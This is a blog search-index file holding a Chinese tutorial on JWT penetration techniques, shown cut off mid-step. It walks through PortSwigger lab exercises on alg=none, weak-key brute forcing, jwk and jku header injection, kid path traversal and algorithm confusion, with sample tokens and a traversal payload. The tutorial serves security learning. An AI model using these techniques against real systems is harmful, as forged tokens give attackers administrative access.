<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>JWT渗透姿势</title>
    <url>/blog/2023/12/23/231223JWT%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h2 id="0X01-什么是jwt？"><a href="#0X01-什么是jwt？" class="headerlink" title="0X01 什么是jwt？"></a>0X01 什么是jwt？</h2><blockquote>
<p>JWT 全称 JSON Web Token，是一种标准化格式，用于在系统之间发送加密签名的 JSON 数据。</p>
<p>原始的 Token 只是一个 uuid，没有任何意义。</p>
</blockquote>
<p>JWT的结构由三部分组成，分别是Header、Payload和Signature，下面是每一部分的详细介绍和示例：</p>
<h3 id="Header-部分"><a href="#Header-部分" class="headerlink" title="Header 部分"></a>Header 部分</h3><p>在 JWT 中 Header 部分存储的是 Token 类型和加密算法，通常使用JSON对象表示并使用Base64编码，其中包含两个字段：alg和typ</p>
<ul>
<li>alg(algorithm)：指定了使用的加密算法，常见的有HMAC、RSA和ECDSA等算法</li>
<li>typ(type)：指定了JWT的类型，通常为JWT</li>
</ul>
<p>下面是一个示例Header：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span> </span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Payload-部分"><a href="#Payload-部分" class="headerlink" title="Payload 部分"></a>Payload 部分</h3><p>Payload包含了JWT的主要信息，通常使用JSON对象表示并使用Base64编码，Payload中包含三个类型的字段：注册声明、公共声明和私有声明</p>
<ul>
<li>公共声明：是自定义的字段，用于传递非敏感信息，例如:用户ID、角色等</li>
<li>私有声明：是自定义的字段，用于传递敏感信息，例如密码、信用卡号等</li>
<li>注册声明：预定义的标准字段，包含了一些JWT的元数据信息，例如:发行者、过期时间等</li>
</ul>
<p>下面是一个示例Payload：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1516239022</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>其中sub表示主题，name表示名称，iat表示JWT的签发时间</p>
<h3 id="Signature-部分"><a href="#Signature-部分" class="headerlink" title="Signature 部分"></a>Signature 部分</h3><p>Signature是使用指定算法对Header和Payload进行签名生成的，用于验证JWT的完整性和真实性</p>
<ul>
<li>Signature的生成方式通常是将Header和Payload连接起来然后使用指定算法对其进行签名，最终将签名结果与Header和Payload一起组成JWT</li>
<li>Signature的生成和验证需要使用相同的密钥</li>
</ul>
<p>下面是一个示例Signature</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),secret)</span><br></pre></td></tr></table></figure>

<p>其中HMACSHA256是使用HMAC SHA256算法进行签名，header和payload是经过Base64编码的Header和Payload，secret是用于签名和验证的密钥，最终将Header、Payload和Signature连接起来用句点(.)分隔就形成了一个完整的JWT</p>
<h3 id="完整的JWT"><a href="#完整的JWT" class="headerlink" title="完整的JWT"></a>完整的JWT</h3><p>第一部分是Header，第二部分是Payload，第三部分是Signature，它们之间由三个 <code>.</code> 分隔，注意JWT 中的每一部分都是经过Base64编码的，但并不是加密的，因此JWT中的信息是可以被解密的</p>
<p>下面是一个示例JWT</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>

<h2 id="0X02-解密平台"><a href="#0X02-解密平台" class="headerlink" title="0X02 解密平台"></a>0X02 解密平台</h2><p>下面是一个JWT在线构造和解构的平台：</p>
<p><a class="link"   href="https://jwt.io/" >https://jwt.io/<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/658588f08f737.png"  alt="image-20231222210239843"></p>
<h2 id="0X03-工作原理"><a href="#0X03-工作原理" class="headerlink" title="0X03 工作原理"></a>0X03 工作原理</h2><p>JWT的工作流程如下：</p>
<ul>
<li>用户在客户端登录并将登录信息发送给服务器</li>
<li>服务器使用私钥对用户信息进行加密生成JWT并将其发送给客户端</li>
<li>客户端将JWT存储在本地，每次向服务器发送请求时携带JWT进行认证</li>
<li>服务器使用公钥对JWT进行解密和验证，根据JWT中的信息进行身份验证和授权</li>
<li>服务器处理请求并返回响应，客户端根据响应进行相应的操作</li>
</ul>
<h2 id="0X04-jWT名词"><a href="#0X04-jWT名词" class="headerlink" title="0X04 jWT名词"></a>0X04 jWT名词</h2><ol>
<li>JWS（Signed JWT）：JWS是指已签名的JWT。它由JWT的Header、Payload和Signature组成，其中Signature是使用密钥对Header和Payload进行数字签名得到的。通过验证签名，可以确保JWT的完整性和真实性。</li>
<li>JWK（JSON Web Key）：JWK是指用于JWT的密钥。它可以是对称加密密钥（例如密码），也可以是非对称加密密钥（例如公钥&#x2F;私钥对）。JWK用于生成和验证JWT的签名，确保只有拥有正确密钥的一方能够对JWT进行操作。</li>
<li>JWE（Encrypted JWT）：JWE是指经过加密的JWT。它是在JWS基础上进行了进一步的加密，将JWT的Payload部分加密后得到的结果。JWE可用于保护敏感信息，确保只有授权的接收方能够解密和读取JWT的内容。</li>
<li>JKU（JSON Web Key Set URL）：JKU是JWT Header中的一个字段，该字段包含一个URI，用于指定用于验证令牌密钥的服务器。当需要获取公钥或密钥集合时，可以使用JKU字段指定的URI来获取相关的JWK信息。</li>
<li>X5U：X5U是JWT Header中的一个字段，它是一个URL，指向一组X.509公钥证书。类似于JKU，X5U字段用于指定可用于验证JWT的公钥证书的位置。</li>
<li>X.509标准：X.509是一种密码学标准，定义了公共密钥基础设施（PKI）中的数字证书格式。这些证书包含有关实体（例如个人、组织或设备）的信息，以及相关的公钥和数字签名。X.509证书在许多互联网协议中广泛使用，如TLS&#x2F;SSL等。</li>
</ol>
<h2 id="0x05-JWT-基础安全问题"><a href="#0x05-JWT-基础安全问题" class="headerlink" title="0x05 JWT 基础安全问题"></a>0x05 JWT 基础安全问题</h2><h3 id="1、未对签名进行验证"><a href="#1、未对签名进行验证" class="headerlink" title="1、未对签名进行验证"></a>1、未对签名进行验证</h3><p>JWT库会通常提供一种验证令牌的方法和一种解码令牌的方法，比如:Node.js库jsonwebtoken有verify()和decode()，有时开发人员会混淆这两种方法，只将传入的令牌传递给decode()方法，这意味着应用程序根本不验证签名</p>
<p>下边我们通过portswigger靶场来演示一下这个漏洞案例：</p>
<p>靶场地址：<a class="link"   href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature" >https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/658599552c13f.png"  alt="image-20231222221236099"></p>
<p>（1）首先看看通关要求：修改您的会话令牌以访问管理面板<code>/admin</code>，然后删除用户<code>carlos</code></p>
<p>（2）前文我们说到，JWT 需要开发者提供一个 Signature（签名），如果我们不对签名进行验证，极有可能产生如下的越权情况。</p>
<p>（3）打开靶场，登录，访问<code>/admin</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/65859a07165b4.png"  alt="image-20231222221534305"></p>
<p>（4）因为我们使用的jwt，所以权限相关的设置肯定在jwt中。我们抓个包拿到jwt解密看看</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/65859ab021386.png"  alt="image-20231222221823154"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/65859aedf1b59.png"  alt="image-20231222221925066"></p>
<p>（5）把<code>wiener</code>修改成<code>administrator</code></p>
<p>把第二部分payload拿出来base64解密，然后修改，修改万再拼接会jwt中</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/65859b9a35aa0.png"  alt="image-20231222222217488"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/65859bd8311f0.png"  alt="image-20231222222319473"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/65859c04f0b03.png"  alt="image-20231222222404181"></p>
<p>（6）把修改后的jwt替换原本的jwt</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/65859c411e28e.png"  alt="image-20231222222504138"></p>
<p>（7）访问<code>/admin</code>，删除<code>carlos</code>用户即可通关</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/65859c725da1b.png"  alt="image-20231222222553594"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/65859c9ba91bf.png"  alt="image-20231222222634903"></p>
<h3 id="2、未对加密算法进行强验证"><a href="#2、未对加密算法进行强验证" class="headerlink" title="2、未对加密算法进行强验证"></a>2、未对加密算法进行强验证</h3><p>在JWT的Header中alg的值用于告诉服务器使用哪种算法对令牌进行签名，从而告诉服务器在验证签名时需要使用哪种算法，目前可以选择HS256，即HMAC和SHA256，JWT同时也支持将算法设定为”None”，如果”alg”字段设为”None”，则标识不签名，这样一来任何token都是有效的，设定该功能的最初目的是为了方便调试，但是若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为”None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站</p>
<p>下边我们通过portswigger靶场来演示一下这个漏洞案例：</p>
<p>靶场地址：<a class="link"   href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification" >https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/65859dbf87702.png"  alt="image-20231222223126751"></p>
<p>这关与上边的漏洞原理不同，但最终的效果都是可以<code>伪造token</code>，攻击手法与上一关卡相同，唯一不同的是这次是需要<code>把header中的alg参数的值改为none</code>即可！</p>
<p>不在演示！</p>
<h3 id="3、-弱密钥"><a href="#3、-弱密钥" class="headerlink" title="3、 弱密钥"></a>3、 弱密钥</h3><p>在实现JWT应用程序时，开发人员有时会犯一些错误，比如：忘记更改默认密码或占位符密码，他们甚至可能复制并粘贴他们在网上找到的代码片段然后忘记更改作为示例提供的硬编码秘密，在这种情况下攻击者使用众所周知的秘钥来暴力破解服务器的秘钥是很容易的</p>
<p>下边我们通过portswigger靶场来演示一下这个漏洞案例：</p>
<p>靶场地址：<a class="link"   href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key" >https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/6585a134841f0.png"  alt="image-20231222224611748"></p>
<p>（1）打开靶场 –&gt;  登录  –&gt;  抓包  –&gt;  拿到JWT</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/6585a2b4729a5.png"  alt="image-20231222225235639"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJraWQiOiIwZWMxNmY3ZS0yOGU0LTQxMjUtYjUxMS0yZDc1ZmRjZjRiM2QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcwMzI2MDMwOH0.t5QY8-kd-bzIqp0PyXg2EUUxg1jPl6-NYKBI4BTw8P0</span><br></pre></td></tr></table></figure>

<p>（2）JWT字典：<a class="link"   href="https://github.com/wallarm/jwt-secrets" >https://github.com/wallarm/jwt-secrets<i class="fas fa-external-link-alt"></i></a></p>
<p>（3）我们使用<code>jwt_tool</code>来爆破JWT：<a class="link"   href="https://github.com/ticarpi/jwt_tool" >https://github.com/ticarpi/jwt_tool<i class="fas fa-external-link-alt"></i></a></p>
<p>使用教程：<a class="link"   href="https://www.cnblogs.com/xiaozi/p/12005929.html" >https://www.cnblogs.com/xiaozi/p/12005929.html<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/6585a24798ff0.png"  alt="image-20231222225046915"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/6585a3eb1b605.png"  alt="image-20231222225746340"></p>
<p>（4）拿到爆破出来的秘钥<code>secret1</code>，我们篡改jwt</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/6585a4920fcb6.png"  alt="image-20231222230033259"></p>
<p>（5）修改本地或者抓包修改jwt都可以，然后访问&#x2F;admin，删除<code>carlos</code>用户</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/22/6585a5892f164.png"  alt="image-20231222230440373"></p>
<h2 id="0X06-JWT-标头注入"><a href="#0X06-JWT-标头注入" class="headerlink" title="0X06 JWT 标头注入"></a>0X06 JWT 标头注入</h2><h3 id="1、通过jwk参数注入自签名的JWT"><a href="#1、通过jwk参数注入自签名的JWT" class="headerlink" title="1、通过jwk参数注入自签名的JWT"></a>1、通过jwk参数注入自签名的JWT</h3><p>（1）再来回顾一下jwk是什么吧！</p>
<p>JWK（JSON Web Key）：JWK是指用于JWT的密钥。它可以是对称加密密钥（例如密码），也可以是非对称加密密钥（例如公钥&#x2F;私钥对）</p>
<p>（2）漏洞原理</p>
<p>在理想情况下，服务器应该是只使用公钥白名单来验证JWT签名的，但对于一些相关配置错误的服务器会用JWK参数中嵌入的任何密钥进行验证，攻击者就可以利用这一行为，用自己的RSA私钥对修改过的JWT进行签名，然后在JWK头部中嵌入对应的公钥进行越权操作</p>
<p>（3） RSA加密算法</p>
<p><a class="link"   href="https://www.cnblogs.com/pcheng/p/9629621.html" >https://www.cnblogs.com/pcheng/p/9629621.html<i class="fas fa-external-link-alt"></i></a></p>
<p>这位师傅的文章总结的非常好，<strong>公钥加密、私钥解密、私钥签名、公钥验签。</strong></p>
<p>下边我们通过portswigger靶场来演示一下这个漏洞案例：</p>
<p>靶场地址：<a class="link"   href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection" >https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585dc8b11bdf.png"  alt="image-20231223025921262"></p>
<p>（1）这个案例我们使用<code>burpsuite</code>，首先先去安装一个插件<code>jwt enditor</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585dce48f82a.png"  alt="image-20231223030051079"></p>
<p>（2）安装好了后我们使用它生成一个新的RSA密钥</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585dd8116d0e.png"  alt="image-20231223030327718"></p>
<p>（3）打开靶场 –&gt; 登录 –&gt;  bp抓包  –&gt;  发送到<code>Repeat</code>模块</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585defc7c7f6.png"  alt="image-20231223030946972"></p>
<p>（4）将sub内容修改为administrator</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585df2240053.png"  alt="image-20231223031024846"></p>
<p>（5）点击”Attack”，然后选择”Embedded JWK”，</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585df63474e8.png"  alt="image-20231223031129929"></p>
<p>（6）出现提示时选择您新生成的RSA密钥</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585df84ae523.png"  alt="image-20231223031203432"></p>
<p>（7）复制新生成的jwt</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585dfae54b0f.png"  alt="image-20231223031245153"></p>
<p>（8）替换本地的jwt</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585dff21fa15.png"  alt="image-20231223031352592"></p>
<p>（9）然后访问&#x2F;admin，删除<code>carlos</code>用户</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585e02e25af9.png"  alt="image-20231223031452606"></p>
<h3 id="2、通过jku参数注入自签名的JWT"><a href="#2、通过jku参数注入自签名的JWT" class="headerlink" title="2、通过jku参数注入自签名的JWT"></a>2、通过jku参数注入自签名的JWT</h3><p>（1）先回顾什么是jku？</p>
<p>JKU（JSON Web Key Set URL）：JKU是JWT Header中的一个字段，该字段包含一个URI，用于指定用于验证令牌密钥的服务器。当需要获取公钥或密钥集合时，可以使用JKU字段指定的URI来获取相关的JWK信息。</p>
<p>（2）看看他长什么样？</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585e78e1bcd1.png"  alt="image-20231223034620634"></p>
<p>下边我们通过portswigger靶场来演示一下这个漏洞案例：</p>
<p>靶场地址：<a class="link"   href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection" >https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection<i class="fas fa-external-link-alt"></i></a></p>
<p>（1）分析一下</p>
<p>漏电点都是仅通过公钥判断数据是否被篡改，但公钥在header头中，用户可控！</p>
<p>唯一的区别就是这关中的公钥使用服务器获取的。</p>
<p>（2）那还是之前的流程</p>
<ul>
<li><code>jwt enditor</code>生成一个新的RSA密钥，使用之前的也可以</li>
<li>打开靶场 –&gt; 登录 –&gt;  bp抓包  –&gt;  发送到<code>Repeat</code>模块</li>
</ul>
<p>（3）复制公钥，拿到漏洞利用服务器（在题目中选择”Go eo exploit server”，然后加上key头并保存到exploit的body中）</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585e501b6660.png"  alt="image-20231223033528304"></p>
<p>切记加<code>key</code>头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;keys&quot;: [</span><br><span class="line"></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585ed2abc3ce.png"  alt="image-20231223041017444"></p>
<p>（4）在bp中需要改动三处</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585ee303c15b.png"  alt="image-20231223041438999"></p>
<ul>
<li>kid：改成我们插件生成的公钥中的kid</li>
<li>jku：添加jdu字段（漏洞利用服务器地址）<img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585e6c720e03.png"  alt="image-20231223034301655"></li>
<li>sub：讲wiener改为administrator</li>
</ul>
<p>（5）点击下面的sign，选择Don’t modify header模式</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585e73ce4eea.png"  alt="image-20231223034459509"></p>
<p>（6）之后的流程</p>
<p>替换本地jwt –&gt; 删除<code>carlos</code>用户</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6585edb8beba2.png"  alt="image-20231223041239306"></p>
<h3 id="3、通过-kid-注入-JWT，与目录遍历攻击相结合"><a href="#3、通过-kid-注入-JWT，与目录遍历攻击相结合" class="headerlink" title="3、通过 kid 注入 JWT，与目录遍历攻击相结合"></a>3、通过 kid 注入 JWT，与目录遍历攻击相结合</h3><p>JWS 规范没有针对 kid 进行严格设置，比如必须是 uuid 的格式或者是其他的，它只是开发人员选择的任意字符串。</p>
<p>那么我们可以通过将 kid 指向数据库中的特定条目，或者是指向文件名，作为验证密钥。</p>
<p>例如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../path/to/file&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;k&quot;</span><span class="punctuation">:</span> <span class="string">&quot;asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>当 JWT 使用的是对称加密算法的时候，极有可能存在目录遍历的漏洞，我们能够强制服务器使用其文件系统中的任意文件作为验证密钥。</p>
<p>我们可以先尝试读取<code>dev/null</code>这一文件，<code>dev/null</code>这一文件默认为空文件，返回为 null，我们可以在 Symmetric Key 中，将 k 值修改为<code>AA==</code>也就是 null，进行攻击。</p>
<p>下边我们通过portswigger靶场来演示一下这个漏洞案例：</p>
<p>靶场地址：<a class="link"   href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal" >https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/65869ae2b7442.png"  alt="image-20231223163130615"></p>
<p>（1）使用bp插件<code>jwt enditor</code>生成一个 <strong>Symmetric Key</strong>，也就是对称密钥，并将 k 的值修改为<code>AA==</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586992016a7a.png"  alt="image-20231223162359656"></p>
<p>（2）打开靶场 –&gt; 登录 –&gt;  bp抓包  –&gt;  发送到<code>Repeat</code>模块</p>
<p>（3）接着，我们在抓到的包中修改 kid 值，尝试用目录遍历读取<code>dev/null</code>此文件。并将 sub 修改为 administrator</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/65869a298e21f.png"  alt="image-20231223162825481"></p>
<p>（4）点击下面的 Sign，使用 OCT8 的密钥攻击。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/65869a4974ae5.png"  alt="image-20231223162857397"></p>
<p>（5）接着就是：替换本地jwt –&gt; 删除<code>carlos</code>用户</p>
<p>因为是目录遍历，所以多尝试。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/65869a8153d68.png"  alt="image-20231223162953206"></p>
<h2 id="0X07-JWT算法混淆"><a href="#0X07-JWT算法混淆" class="headerlink" title="0X07 JWT算法混淆"></a>0X07 JWT算法混淆</h2><h3 id="1、对称加密与非对称加密。"><a href="#1、对称加密与非对称加密。" class="headerlink" title="1、对称加密与非对称加密。"></a>1、对称加密与非对称加密。</h3><p>可以使用一系列不同的算法对 JWT 进行签名。其中一些，如HS256（HMAC + SHA-256）使用“对称”密钥。这意味着服务器使用单个密钥对 Token 进行签名和验证。显然，这需要保密，就像密码一样。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/65869ea268d0f.jpg" ></p>
<p>其他算法，例如 RS256 (RSA + SHA-256) 使用“非对称”密钥对。它由服务器用来签署令牌的私钥和可用于验证签名的数学相关的公钥组成。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/65869eb195781.jpg" ></p>
<p>顾名思义，私钥必须保密，但公钥通常是共享的，以便任何人都可以验证服务器颁发的令牌的签名。</p>
<h3 id="2、算法混淆漏洞产生的原因？"><a href="#2、算法混淆漏洞产生的原因？" class="headerlink" title="2、算法混淆漏洞产生的原因？"></a>2、算法混淆漏洞产生的原因？</h3><p>算法混乱漏洞通常是由于 <code>JWT 库的实现有缺陷而引起</code>的。尽管实际的验证过程因所使用的算法而异，但许多库提供了一种与算法无关的单一方法来验证签名。这些方法依赖于<code>alg</code>令牌标头中的参数来确定它们应执行的验证类型。</p>
<p>以下伪代码显示了此泛型<code>verify()</code>方法的声明在 JWT 库中的简化示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">function <span class="title function_">verify</span><span class="params">(token, secretOrPublicKey)</span>&#123; </span><br><span class="line">	algorithm = token.getAlgHeader(); </span><br><span class="line">	<span class="keyword">if</span>(algorithm == <span class="string">&quot;RS256&quot;</span>)</span><br><span class="line">	&#123; </span><br><span class="line">		<span class="comment">// Use the provided key as an RSA public key </span></span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (algorithm == <span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">	&#123; </span><br><span class="line">		<span class="comment">// Use the provided key as an HMAC secret key </span></span><br><span class="line">		&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当随后使用此方法的网站开发人员假设它将专门处理使用 RS256 等非对称算法签名的 JWT 时，就会出现问题。由于这个有缺陷的假设，他们可能总是将固定的公钥传递给该方法，如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">publicKey = &lt;<span class="keyword">public</span>-key-of-server&gt;; </span><br><span class="line">token = request.getCookie(<span class="string">&quot;session&quot;</span>); </span><br><span class="line">verify(token, publicKey);</span><br></pre></td></tr></table></figure>

<p>在这种情况下，如果服务器收到使用 HS256 等对称算法签名的令牌，则库的通用<code>verify()</code>方法会将公钥视为 HMAC 密钥。这意味着攻击者可以使用 HS256 和公钥对令牌进行签名，并且服务器将使用相同的公钥来验证签名。</p>
<p>上边是抄官方的话，下边我们用大白话来解释一下：</p>
<ul>
<li>假设开发使用的是<code>RS256</code>这非对称加密算法生成的jwt。</li>
<li>由于信息泄露等原因攻击者可以拿到这个<code>公钥</code>，因为上边说过公钥通常是共享的</li>
<li>攻击者使用<code>HS256</code>算法伪造一个jwt，用这个<code>公钥</code>作为签名的密钥。</li>
</ul>
<p>程序会使用<code>verify()</code>这个方法来验证jwt有没有被篡改。但是这个库设计的有问题（问题：他是通过你jwt头中<code>alg</code>来判断是使用那种算法来进行签名的。所以我们可以篡改他的算法），这块就会使用<code>RS256</code>生成的公钥作为<code>HS256</code>的秘钥来验证攻击者伪造的jwt。这个公钥攻击者可控，所以伪造的jwt就会通过验证。</p>
<h3 id="3、执行算法混淆攻击的步骤"><a href="#3、执行算法混淆攻击的步骤" class="headerlink" title="3、执行算法混淆攻击的步骤"></a>3、执行算法混淆攻击的步骤</h3><p>算法混淆攻击通常涉及以下高级步骤：</p>
<ul>
<li><a class="link"   href="https://portswigger.net/web-security/jwt/algorithm-confusion#step-1-obtain-the-server-s-public-key" >获取服务器的公钥<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://portswigger.net/web-security/jwt/algorithm-confusion#step-2-convert-the-public-key-to-a-suitable-format" >将公钥转换为合适的格式<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://portswigger.net/web-security/jwt/algorithm-confusion#step-3-modify-your-jwt" >创建一个恶意 JWT，<i class="fas fa-external-link-alt"></i></a>其负载经过修改，<code>alg</code>标头设置为<code>HS256</code>.</li>
<li>使用公钥作为秘密，使用 <a class="link"   href="https://portswigger.net/web-security/jwt/algorithm-confusion#step-4-sign-the-jwt-using-the-public-key" >HS256 对令牌进行签名。<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h3 id="4、通过算法混淆绕过-JWT-身份验证"><a href="#4、通过算法混淆绕过-JWT-身份验证" class="headerlink" title="4、通过算法混淆绕过 JWT 身份验证"></a>4、通过算法混淆绕过 JWT 身份验证</h3><p>下边我们通过portswigger靶场来演示一下这个漏洞案例：</p>
<p>靶场地址：<a class="link"   href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion" >https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586a7e898918.png"  alt="image-20231223172704453"></p>
<p>（1）获取服务器的公钥</p>
<p>服务器有时通过映射到&#x2F;jwks.json或&#x2F;.well-known&#x2F;jwks.json的端点将它们的公钥公开为JSON Web Key(JWK)对象，比如大家熟知的&#x2F;jwks.json，这些可能被存储在一个称为密钥的jwk数组中，这就是众所周知的JWK集合</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/23/6586a492459d1.png"  alt="image-20231223171250162"></p>
<p>（2）将公钥转换为合适的格式</p>
